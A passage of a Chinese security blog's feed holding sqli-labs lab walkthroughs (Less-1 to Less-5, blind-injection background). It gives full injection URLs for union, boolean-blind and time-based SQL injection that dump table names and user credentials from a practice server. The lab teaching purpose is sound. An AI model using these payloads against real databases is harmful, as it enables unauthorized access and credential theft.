class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),2)%3E%27sa%27--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092313.png" alt="image"></p><p>往下的举一反三。即可得到完整的数据库名</p><h3 id="利用substr-ascii-注入"><a href="#利用substr-ascii-注入" class="headerlink" title="利用substr()ascii()注入"></a>利用substr()ascii()注入</h3><p>根据以上得知数据库名为 security，那我们利用此方式获取 security 数据库下的表。<br>获取 security 数据库的第一个表的第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),1,1))&gt;101--+</span><br></pre></td></tr></table></figure><blockquote><p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因<br>为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止，此处应该是 101，因为第一个表示 email。</p></blockquote><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092314.png" alt="image"></p><p>如何获取第一个表的第二位字符呢？<br>这里我们已经了解了 substr()函数，这里使用 substr(**,2,1)即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),2,1))&gt;101--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092315.png" alt="image"></p><p>那如何获取第二个表呢？思考一下！<br>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那要获取第二个是不是就是 limit 1,1！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%201,1),1,1))&gt;113--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092316.png" alt="image"></p><p>以后的过程就是不断的重复上面的，这里就不重复造轮子了。原理已经解释清楚了。<br>当你按照方法运行结束后，就可以获取到所有的表的名字</p><h3 id="利用regexp获取users表中的列"><a href="#利用regexp获取users表中的列" class="headerlink" title="利用regexp获取users表中的列"></a>利用regexp获取users表中的列</h3><p>sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)</span><br></pre></td></tr></table></figure><p>payload请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092317.png" alt="image"></p><p>上述语句时选择 users 表中的列名是否有 us**的列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20column_name%20regexp%20%27^username%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092318.png" alt="image"></p><p>上图中可以看到 username 存在。我们可以将 username 换成 password 等其他的项也是正确的</p><h3 id="利用ord-函数和mid-函数获取users表的内容"><a href="#利用ord-函数和mid-函数获取users表的内容" class="headerlink" title="利用ord()函数和mid()函数获取users表的内容"></a>利用ord()函数和mid()函数获取users表的内容</h3><p>sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68</span><br></pre></td></tr></table></figure><p>payload请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))&#x3D;%2068--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092319.png" alt="image"></p><p>获取 users 表中的内容。获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较，即为 D。而我们从表中得知第一行的数据为 Dumb。所以接下来只需要重复造轮子即可</p><hr><p>总结：以上我们通过使用不同的语句，将通过布尔盲注 SQL 的所有<br>的 payload 进行演示了一次。想必通过实例更能够对 sql 布尔盲注语句熟悉和理解了。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Less5&quot;&gt;&lt;a href=&quot;#Less5&quot; class=&quot;headerlink&quot; title=&quot;Less5&quot;&gt;&lt;/a&gt;Less5&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示&lt;br&gt;一下使用方法。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以&lt;br&gt;看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，&lt;br&gt;所以我们不能利用上述 less1-4 的方法&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092308.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h3 id=&quot;利用left-函数注入&quot;&gt;&lt;a href=&quot;#利用left-函数注入&quot; class=&quot;headerlink&quot; title=&quot;利用left()函数注入&quot;&gt;&lt;/a&gt;利用left()函数注入&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;47.101.62.20:11567&amp;#x2F;Less-5&amp;#x2F;?id&amp;#x3D;1%27and%20left(version(),1)&amp;#x3D;5--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是&lt;br&gt;不是 5，明显的返回的结果是正确的。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092309.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;p&gt;当版本号不对的时候，则显示为空&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092310.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs-Background-2 盲注</title>
-    <link href="https://hzktester.top/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-2%20%E7%9B%B2%E6%B3%A8(%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3)/"/>
-    <id>https://hzktester.top/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-2%20%E7%9B%B2%E6%B3%A8(%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3)/</id>
-    <published>2020-09-23T08:51:00.000Z</published>
-    <updated>2020-09-23T08:58:06.023Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h2><blockquote><p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p></blockquote><p>从background-1 中，我们可以知道盲注分为三类 <strong>基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注</strong>。</p><h2 id="基于布尔SQL盲注——构造逻辑判断"><a href="#基于布尔SQL盲注——构造逻辑判断" class="headerlink" title="基于布尔SQL盲注——构造逻辑判断"></a>基于布尔SQL盲注——构造逻辑判断</h2><h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid()函数"></a>mid()函数</h3><p>此函数为截取字符串一部分。<strong>MID(column_name,start[,length])</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>必需。要提取字符的字段</td></tr><tr><td>start</td><td>必需。规定开始位置（起始值是 1）</td></tr><tr><td>length</td><td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本</td></tr></tbody></table><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MID(DATABASE(),1,1)&gt;’a’     &#x2F;&#x2F;数据库名第一位</span><br><span class="line">MID(DATABASE(),2,1)         &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure><p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure><p>此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p><h3 id="substr-函数和substring-函数"><a href="#substr-函数和substring-函数" class="headerlink" title="substr()函数和substring()函数"></a>substr()函数和substring()函数</h3><p><strong>Substr()</strong> 和 <strong>substring()</strong> 函数实现的功能是一样的，均为截取字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string substring(string, start, length)</span><br><span class="line">string substr(string, start, length)</span><br></pre></td></tr></table></figure><p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(DATABASE(),1,1)&gt;’a’  &#x2F;&#x2F;数据库名第一位</span><br><span class="line">substr(DATABASE(),2,1)      &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure><p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure><p>此处string参数可以为sql语句，可自行构造sql语句进行注入。</p><h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p><strong>Left()</strong> 得到字符串左部指定个数的字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(string,n)        &#x2F;&#x2F;string为要截取的字符串，n为长度。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure><p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p><p>同样的，string可以为自行构造的SQL语句</p><h3 id="ORD-函数和ascii-函数"><a href="#ORD-函数和ascii-函数" class="headerlink" title="ORD()函数和ascii()函数"></a>ORD()函数和ascii()函数</h3><p>返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORD(MID(DATABASE(),1,1))&gt;114</span><br><span class="line">ascii(MID(DATABASE(),1,1))&gt;114</span><br></pre></td></tr></table></figure><p>意为检测<strong>database()</strong> 的第一位<strong>ASCII</strong>码是否大于114，也即是‘r’</p><h3 id="regexp-函数"><a href="#regexp-函数" class="headerlink" title="regexp()函数"></a>regexp()函数</h3><p>正则注入此处不做详解可参考文章<br><a href="https://www.cnblogs.com/lcamry/articles/5717442.html">https://www.cnblogs.com/lcamry/articles/5717442.html</a></p><h2 id="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"></a>基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</h2><p><a href="https://bugs.mysql.com/bug.php?id=8652">mysql-bug #8652</a></p><p>BUG #8652的主要内容就是在同时使用<strong>RAND()**函数，聚集函数</strong>COUNT()<strong>和</strong>GROUP BY**子句进行操作时会返回duplicate key 错误，而这个错误将会披露关键信息</p><p>详细原理可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43249758/article/details/104168777">https://blog.csdn.net/weixin_43249758/article/details/104168777</a></p><h2 id="基于时间的SQL盲注——延时注入"><a href="#基于时间的SQL盲注——延时注入" class="headerlink" title="基于时间的SQL盲注——延时注入"></a>基于时间的SQL盲注——延时注入</h2><p>使用sleep()函数<br>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure><p>if判断语句，条件为假，执行sleep</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(find_in_set(mid(@@version, 1, 1),&#39;0,1,2,3,4,5,6,7,8,9,.&#39;));</span><br></pre></td></tr></table></figure><p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;什么是盲注？&quot;&gt;&lt;a href=&quot;#什么是盲注？&quot; class=&quot;headerlink&quot; title=&quot;什么是盲注？&quot;&gt;&lt;/a&gt;什么是盲注？&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显&lt;br&gt;到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;从background-1 中，我们可以知道盲注分为三类 &lt;strong&gt;基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注&lt;/strong&gt;。&lt;/p&gt;
-&lt;h2 id=&quot;基于布尔SQL盲注——构造逻辑判断&quot;&gt;&lt;a href=&quot;#基于布尔SQL盲注——构造逻辑判断&quot; class=&quot;headerlink&quot; title=&quot;基于布尔SQL盲注——构造逻辑判断&quot;&gt;&lt;/a&gt;基于布尔SQL盲注——构造逻辑判断&lt;/h2&gt;&lt;h3 id=&quot;mid-函数&quot;&gt;&lt;a href=&quot;#mid-函数&quot; class=&quot;headerlink&quot; title=&quot;mid()函数&quot;&gt;&lt;/a&gt;mid()函数&lt;/h3&gt;&lt;p&gt;此函数为截取字符串一部分。&lt;strong&gt;MID(column_name,start[,length])&lt;/strong&gt;&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;参数&lt;/th&gt;
-&lt;th&gt;描述&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;&lt;tr&gt;
-&lt;td&gt;column_name&lt;/td&gt;
-&lt;td&gt;必需。要提取字符的字段&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;start&lt;/td&gt;
-&lt;td&gt;必需。规定开始位置（起始值是 1）&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;length&lt;/td&gt;
-&lt;td&gt;可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-&lt;p&gt;示例：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;MID(DATABASE(),1,1)&amp;gt;’a’     &amp;#x2F;&amp;#x2F;数据库名第一位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MID(DATABASE(),2,1)         &amp;#x2F;&amp;#x2F;数据库名第二位&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;查看数据库名第一位的&lt;strong&gt;ASCII&lt;/strong&gt;值是否大于a。返回true或flase&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs靶场Less-1-4</title>
-    <link href="https://hzktester.top/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-1-4/"/>
-    <id>https://hzktester.top/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-1-4/</id>
-    <published>2020-09-23T05:13:00.000Z</published>
-    <updated>2020-09-23T05:13:45.972Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><h3 id="验证存在SQL注入"><a href="#验证存在SQL注入" class="headerlink" title="验证存在SQL注入"></a>验证存在SQL注入</h3><p><strong><a href="http://47.101.62.20:11567/Less-1/?id=1">http://47.101.62.20:11567/Less-1/?id=1</a></strong> 后面直接添加一个’，报错</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092304.png" alt="image"></p><h3 id="使用order-by得到有多少字段数"><a href="#使用order-by得到有多少字段数" class="headerlink" title="使用order by得到有多少字段数"></a>使用order by得到有多少字段数</h3><p>依次请求order by 1,2,3,4直到报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;1%27order%20by%204--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092305.png" alt="image"></p><p>证明有三个字段</p><h3 id="使用union联合注入，得到能回显的字段"><a href="#使用union联合注入，得到能回显的字段" class="headerlink" title="使用union联合注入，得到能回显的字段"></a>使用union联合注入，得到能回显的字段</h3><p>请求 ?id=-1 union select 1,2,3–+</p><p>id=-1为假，所以页面会执行union select 1,2,3。然后返回能回显的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092306.png" alt="image"></p><p>得到能回显的字段是2和3</p><h3 id="查数据库中的数据"><a href="#查数据库中的数据" class="headerlink" title="查数据库中的数据"></a>查数据库中的数据</h3><h4 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure><p>此时的SQL语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092301.png" alt="image"></p><h4 id="爆-security-数据库的数据表"><a href="#爆-security-数据库的数据表" class="headerlink" title="爆 security 数据库的数据表"></a>爆 security 数据库的数据表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure><p>此时的SQL语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092302.png" alt="image"></p><h4 id="爆-users-表的列"><a href="#爆-users-表的列" class="headerlink" title="爆 users 表的列"></a>爆 users 表的列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27--+</span><br></pre></td></tr></table></figure><p>此时的SQL语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092303.png" alt="image"></p><h4 id="爆-users表中username和password的值"><a href="#爆-users表中username和password的值" class="headerlink" title="爆 users表中username和password的值"></a>爆 users表中username和password的值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,username,password%20from%20users%20where%20id&#x3D;2--+</span><br></pre></td></tr></table></figure><p>此时的SQL语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,username,password from users where id&#x3D;2--+ LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092307.png" alt="image"></p><h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>可以成功注入的有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or 1&#x3D;1</span><br><span class="line">or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure><p>其余的ppayload于less1中一致，只需要将less1中的’去掉即可</p><h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>可以成功注入的有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">) or &#39;1&#39;&#x3D;(&#39;1&#39; </span><br><span class="line">) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure><p>其余的ppayload于less1中一致，只需要将less1中的’换成’)即可</p><h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>这里id参数使用了””和()包装</p><p>可以成功注入的有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“) or ”1”&#x3D;(“1</span><br><span class="line">“) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure><p>其余的ppayload于less1中一致，只需要将less1中的’换成”)即可</p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Less1&quot;&gt;&lt;a href=&quot;#Less1&quot; class=&quot;headerlink&quot; title=&quot;Less1&quot;&gt;&lt;/a&gt;Less1&lt;/h2&gt;&lt;h3 id=&quot;验证存在SQL注入&quot;&gt;&lt;a href=&quot;#验证存在SQL注入&quot; class=&quot;headerlink&quot; title=&quot;验证存在SQL注入&quot;&gt;&lt;/a&gt;验证存在SQL注入&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://47.101.62.20:11567/Less-1/?id=1&quot;&gt;http://47.101.62.20:11567/Less-1/?id=1&lt;/a&gt;&lt;/strong&gt; 后面直接添加一个’，报错&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092304.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h3 id=&quot;使用order-by得到有多少字段数&quot;&gt;&lt;a href=&quot;#使用order-by得到有多少字段数&quot; class=&quot;headerlink&quot; title=&quot;使用order by得到有多少字段数&quot;&gt;&lt;/a&gt;使用order by得到有多少字段数&lt;/h3&gt;&lt;p&gt;依次请求order by 1,2,3,4直到报错。&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;47.101.62.20:11567&amp;#x2F;Less-1&amp;#x2F;?id&amp;#x3D;1%27order%20by%204--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092305.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;p&gt;证明有三个字段&lt;/p&gt;
-&lt;h3 id=&quot;使用union联合注入，得到能回显的字段&quot;&gt;&lt;a href=&quot;#使用union联合注入，得到能回显的字段&quot; class=&quot;headerlink&quot; title=&quot;使用union联合注入，得到能回显的字段&quot;&gt;&lt;/a&gt;使用union联合注入，得到能回显的字段&lt;/h3&gt;</summary>
-    
-    
-    
-    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs-Background-1 基础知识</title>
-    <link href="https://hzktester.top/2020/09/22/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-1%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
-    <id>https://hzktester.top/2020/09/22/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-1%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
-    <published>2020-09-22T11:00:00.000Z</published>
-    <updated>2020-09-22T10:50:24.271Z</updated>
-    
